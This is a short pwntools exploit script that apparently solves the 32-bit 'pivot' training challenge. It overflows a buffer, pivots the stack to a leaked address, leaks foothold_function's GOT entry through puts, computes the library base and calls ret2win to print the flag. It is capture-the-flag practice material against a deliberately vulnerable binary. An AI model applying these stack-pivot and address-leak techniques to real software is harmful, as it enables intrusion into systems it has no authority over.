#!/usr/bin/env python3

from pwn import *

exe = ELF("pivot32_patched")
libc = ELF("libpivot32.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 44
    rtwoff = 0x974
    footoff = 0x77d
    main = 0x8048686
    footplt = 0x8048520
    footgot = 0x804a024
    putsplt = 0x8048500
    popeax = 0x804882c
    pivot = 0x804882e

    r.recvuntil('pivot: ')
    pivotadd = int(r.recvuntil('\n'), 16)

    payload = flat(footplt, putsplt, main, footgot)
    r.sendline(payload)

    payload = flat(b'A'*offset, popeax, pivotadd, pivot)
    r.sendlineafter(b'>', payload)
    r.recvuntil('libpivot\n')
    leakedadd = r.recvline()
    footleak = unpack(leakedadd[:4].strip())
    libcbase = footleak - footoff
    rtwadd = libcbase + rtwoff

    payload = flat(b'A'*offset, rtwadd)
    r.sendlineafter(b'>', payload)

    r.recvuntil('you!\n')
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
